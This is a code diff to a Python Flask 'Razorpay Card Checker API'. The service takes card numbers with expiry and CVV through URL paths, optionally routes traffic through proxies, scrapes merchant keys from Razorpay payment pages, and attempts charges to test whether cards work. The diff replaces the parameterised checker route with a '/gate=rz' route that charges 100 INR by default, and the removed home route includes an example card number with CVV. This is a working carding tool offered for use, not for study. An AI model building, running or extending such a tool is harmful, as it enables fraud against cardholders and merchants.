@@ -12,19 +12,17 @@ import socket
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from playwright.sync_api import sync_playwright
 from bs4 import BeautifulSoup
-from flask import Flask, jsonify, request
 from typing import Optional
 import threading
 from queue import Queue
 import logging
+from flask import Flask, request, jsonify
 
-
+# Initialize Flask app
 app = Flask(__name__)
-app.config['JSON_SORT_KEYS'] = False
-app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False
 
+# Configure logging
 logging.basicConfig(level=logging.WARNING)
-logging.getLogger('werkzeug').setLevel(logging.WARNING)
 
 request_queue = Queue(maxsize=100)
 processing_lock = threading.Lock()
@@ -140,7 +138,7 @@ def extract_merchant_data_direct(site_url):
             payment_page_item_id = None
             
             try:
-                page.wait_for_timeout(4000)
+                page.wait_for_timeout(3000)
                 
                 data_from_page = page.evaluate("""
                     () => {
@@ -460,269 +458,6 @@ def format_cancel_response(data):
     else:
         return f"Cancel Response: {json.dumps(data, indent=2)}"
 
-@app.route('/callback', methods=['POST'])
-def payment_callback():
-    try:
-        razorpay_payment_id = request.form.get('razorpay_payment_id')
-        razorpay_order_id = request.form.get('razorpay_order_id')
-        razorpay_signature = request.form.get('razorpay_signature')
-        
-        if razorpay_payment_id and razorpay_order_id and razorpay_signature:
-            result = handle_successful_payment(razorpay_payment_id, razorpay_order_id, razorpay_signature)
-            return jsonify(result), 200
-        else:
-            error_code = request.form.get('error[code]', 'unknown')
-            error_description = request.form.get('error[description]', 'Payment failed')
-            return jsonify({
-                'status': 'failed',
-                'error_code': error_code,
-                'error_description': error_description
-            }), 400
-            
-    except Exception as e:
-        return jsonify({
-            'status': 'error',
-            'message': f'Callback processing error: {str(e)}'
-        }), 500
-
-@app.route('/<path:api_path>')
-def check_card(api_path):
-    global PROXY_CONFIG
-    
-    try:
-        params = {}
-        
-        import re
-        
-        key_match = re.search(r'key=([^/]+)', api_path)
-        if key_match:
-            params['key'] = key_match.group(1)
-        
-        proxy_match = re.search(r'proxy=([^/]+(?::[^/]+){3}|[^/]+:[^/]+)', api_path)
-        if proxy_match:
-            params['proxy'] = proxy_match.group(1)
-        
-        site_match = re.search(r'site=(.+?)(?=/price=|/cc=|$)', api_path)
-        if site_match:
-            params['site'] = unquote(site_match.group(1))
-        
-        price_match = re.search(r'price=([^/]+)', api_path)
-        if price_match:
-            params['price'] = price_match.group(1)
-        
-        cc_match = re.search(r'cc=(.+?)(?:/|$)', api_path)
-        if cc_match:
-            params['cc'] = unquote(cc_match.group(1))
-        
-        required = ['key', 'site', 'price', 'cc']
-        missing = [r for r in required if r not in params]
-        if missing:
-            return jsonify({
-                'success': False,
-                'error': f'Missing required parameters: {", ".join(missing)}',
-                'format': '/key=rz/proxy=ip:port:user:pass/site=url/price=1/cc=card|mm|yy|cvv'
-            }), 400
-        
-        if 'proxy' in params:
-            PROXY_CONFIG = setup_proxy(params['proxy'])
-            if not PROXY_CONFIG:
-                return jsonify({
-                    'success': False,
-                    'error': 'Invalid proxy format. Required format: ip:port:username:password'
-                }), 400
-        else:
-            PROXY_CONFIG = None
-        
-        site_url = params['site']
-        amount_rupees = int(params['price'])
-        amount_paise = amount_rupees * 100
-        cc_line = params['cc']
-        
-        keyless_header, key_id, payment_link_id, payment_page_item_id, error_msg = extract_merchant_data_direct(site_url)
-        if error_msg:
-            return jsonify({
-                'success': False,
-                'error': f'Failed to extract merchant data: {error_msg}'
-            }), 500
-        
-        session_token, error_msg = get_dynamic_session_token()
-        if error_msg:
-            return jsonify({
-                'success': False,
-                'error': f'Failed to get session token: {error_msg}'
-            }), 500
-        
-        result = process_single_card(
-            1,
-            cc_line,
-            payment_link_id,
-            amount_paise,
-            payment_page_item_id,
-            key_id,
-            keyless_header,
-            session_token,
-            site_url
-        )
-        
-        clean_status = result['status']
-        
-        if "Redirected to 3DS page. Final Status: " in clean_status:
-            clean_status = clean_status.replace("Redirected to 3DS page. Final Status: ", "")
-        
-        clean_status = clean_status.replace("× ", "").replace("× ", "")
-        
-        description = "Unknown"
-        reason = "unknown"
-        
-        if "PAYMENT_SUCCESS" in clean_status and "Status: charged" in clean_status:
-            description = "Payment completed successfully"
-            reason = "payment_success"
-        elif "PAYMENT_SUCCESS" in clean_status:
-            description = "Payment authorized successfully"
-            reason = "payment_authorized"
-        elif "3DS_AUTH_COMPLETED" in clean_status:
-            cancel_match = re.search(r'CancelResult: (.+)$', clean_status)
-            if cancel_match:
-                cancel_result = cancel_match.group(1).strip()
-                try:
-                    if 'Cancel Request Failed' in cancel_result and '{' in cancel_result:
-                        json_start = cancel_result.find('{')
-                        json_part = cancel_result[json_start:cancel_result.rfind('}')+1]
-                        parsed = json.loads(json_part)
-                        if 'error' in parsed and 'description' in parsed['error']:
-                            description = parsed['error']['description']
-                            reason = parsed['error'].get('reason', 'payment_failed')
-                        else:
-                            description = "Payment processing failed"
-                            reason = "payment_failed"
-                    elif '{' in cancel_result and '}' in cancel_result:
-                        json_part = cancel_result[cancel_result.find('{'):cancel_result.rfind('}')+1]
-                        parsed = json.loads(json_part)
-                        if 'error' in parsed and 'description' in parsed['error']:
-                            description = parsed['error']['description']
-                            reason = parsed['error'].get('reason', 'payment_failed')
-                        else:
-                            description = cancel_result
-                            reason = "payment_cancelled"
-                    else:
-                        description = cancel_result
-                        reason = "payment_cancelled"
-                except:
-                    desc_pattern = re.search(r'"description":"([^"]+)"', cancel_result)
-                    reason_pattern = re.search(r'"reason":"([^"]+)"', cancel_result)
-                    if desc_pattern:
-                        description = desc_pattern.group(1)
-                    else:
-                        description = "Payment processing failed"
-                    if reason_pattern:
-                        reason = reason_pattern.group(1)
-                    else:
-                        reason = "payment_failed"
-            else:
-                auth_match = re.search(r'AuthResult: (.+?) ->', clean_status)
-                if auth_match:
-                    description = auth_match.group(1).strip()
-                    reason = "3ds_completed"
-                else:
-                    description = "3DS authentication completed"
-                    reason = "3ds_completed"
-        elif "description" in clean_status:
-            try:
-                import json
-                if '{' in clean_status and '}' in clean_status:
-                    json_part = clean_status[clean_status.find('{'):clean_status.rfind('}')+1]
-                    parsed = json.loads(json_part)
-                    if 'error' in parsed and 'description' in parsed['error']:
-                        description = parsed['error']['description']
-                    else:
-                        description = "Payment processing failed"
-            except:
-                desc_match = re.search(r'"description":"([^"]+)"', clean_status)
-                if desc_match:
-                    description = desc_match.group(1)
-                else:
-                    description = "Payment processing failed"
-        else:
-            if "SUCCESS" in clean_status or "OK" in clean_status:
-                description = "Payment processed successfully"
-            elif "ERROR" in clean_status:
-                description = "Payment failed"
-            elif "3DS_REDIRECT" in clean_status:
-                description = "3DS authentication in progress"
-            else:
-                description = "Payment status unknown"
-        
-        proxy_ip = "Direct Connection"
-        proxy_status = "N/A"
-        
-        if PROXY_CONFIG and 'server' in PROXY_CONFIG:
-            proxy_server = PROXY_CONFIG['server']
-            ip_match = re.search(r'://([^:]+)', proxy_server)
-            if ip_match:
-                proxy_ip = ip_match.group(1)
-                
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(2)
-                    port_match = re.search(r':([0-9]+)', proxy_server)
-                    port = int(port_match.group(1)) if port_match else 80
-                    result_check = sock.connect_ex((proxy_ip, port))
-                    proxy_status = "Live" if result_check == 0 else "Dead"
-                    sock.close()
-                except:
-                    proxy_status = "Unknown"
-        
-        if reason == "unknown" and "reason" in clean_status:
-            try:
-                if '{' in clean_status and '}' in clean_status:
-                    json_part = clean_status[clean_status.find('{'):clean_status.rfind('}')+1]
-                    parsed = json.loads(json_part)
-                    if 'error' in parsed and 'reason' in parsed['error']:
-                        reason = parsed['error']['reason']
-            except:
-                reason_match = re.search(r'"reason":"([^"]+)"', clean_status)
-                if reason_match:
-                    reason = reason_match.group(1)
-        
-        return jsonify({
-            'description': description,
-            'reason': reason,
-            'proxy_ip': proxy_ip,
-            'proxy_status': proxy_status
-        }), 200
-        
-    except Exception as e:
-        return jsonify({
-            'success': False,
-            'error': str(e)
-        }), 500
-
-@app.route('/')
-def home():
-    return jsonify({
-        'api': 'Razorpay Card Checker API',
-        'version': '2.0',
-        'format': '/key=rz/proxy=ip:port:user:pass/site=url/price=1/cc=card|mm|yy|cvv',
-        'example': '/key=rz/proxy=46.3.63.7:5433:user:pass/site=https://razorpay.me/@merchant/price=1/cc=5178059805565539|10|25|694',
-        'parameters': {
-            'key': 'Razorpay key (required)',
-            'proxy': 'Proxy in format ip:port:username:password (optional)',
-            'site': 'Razorpay payment page URL (required)',
-            'price': 'Amount in Rupees (required)',
-            'cc': 'Card in format card|month|year|cvv (required)'
-        },
-        'response': {
-            'success': 'Boolean - true if check completed',
-            'card': 'Masked card number',
-            'payment_id': 'Razorpay payment ID',
-            'order_id': 'Razorpay order ID',
-            'status': 'Payment status/response',
-            'proxy': 'Proxy used or Direct Connection',
-            'time': 'Processing time in seconds',
-            'timestamp': 'Check timestamp'
-        }
-    }), 200
-
 def process_request_worker():
     while True:
         try:
@@ -741,25 +476,81 @@ def process_card_request(request_data):
     except Exception as e:
         return {'error': str(e)}
 
-if __name__ == "__main__":
-    os_name = platform.system()
-    
-    if os_name == "Linux":
-        os.environ['DISPLAY'] = ':99'
-        
-    for i in range(min(4, os.cpu_count() or 1)):
-        worker = threading.Thread(target=process_request_worker, daemon=True)
-        worker.start()
-    
+# Flask routes
+@app.route('/gate=rz/site=<path:site_url>/cc=<path:card_info>', methods=['GET', 'POST'])
+def process_payment(site_url, card_info):
     try:
-        app.run(
-            host='0.0.0.0', 
-            port=5000, 
-            debug=False,
-            threaded=True,
-            use_reloader=False
+        # Ensure site_url has proper format
+        if not site_url.startswith('http'):
+            site_url = 'https://' + site_url
+        
+        # Parse card information
+        try:
+            card_parts = card_info.split('|')
+            if len(card_parts) != 4:
+                return jsonify({
+                    'status': 'error',
+                    'message': 'Invalid card format. Expected: card_number|exp_month|exp_year|cvv'
+                }), 400
+            
+            card_number, exp_month, exp_year, cvv = card_parts
+        except Exception as e:
+            return jsonify({
+                'status': 'error',
+                'message': f'Error parsing card information: {str(e)}'
+            }), 400
+        
+        # Get merchant data
+        keyless_header, key_id, payment_link_id, payment_page_item_id, error = extract_merchant_data_direct(site_url)
+        if error:
+            return jsonify({
+                'status': 'error',
+                'message': error
+            }), 400
+        
+        # Get session token
+        session_token, token_error = get_dynamic_session_token()
+        if token_error:
+            return jsonify({
+                'status': 'error',
+                'message': token_error
+            }), 500
+        
+        # Default amount (100 INR in paise)
+        amount_paise = 10000
+        
+        # Process the payment
+        result = process_single_card(
+            0,  # card_index
+            card_info,  # cc_line
+            payment_link_id,
+            amount_paise,
+            payment_page_item_id,
+            key_id,
+            keyless_header,
+            session_token,
+            site_url
         )
-    except KeyboardInterrupt:
-        pass
+        
+        return jsonify(result)
+    
     except Exception as e:
-        pass
+        return jsonify({
+            'status': 'error',
+            'message': f'Unexpected error: {str(e)}'
+        }), 500
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})
+
+# Start worker threads
+def start_workers():
+    for _ in range(3):  # Start 3 worker threads
+        t = threading.Thread(target=process_request_worker)
+        t.daemon = True
+        t.start()
+
+if __name__ == "__main__":
+    start_workers()
+    app.run(host='0.0.0.0', port=5000, debug=False)
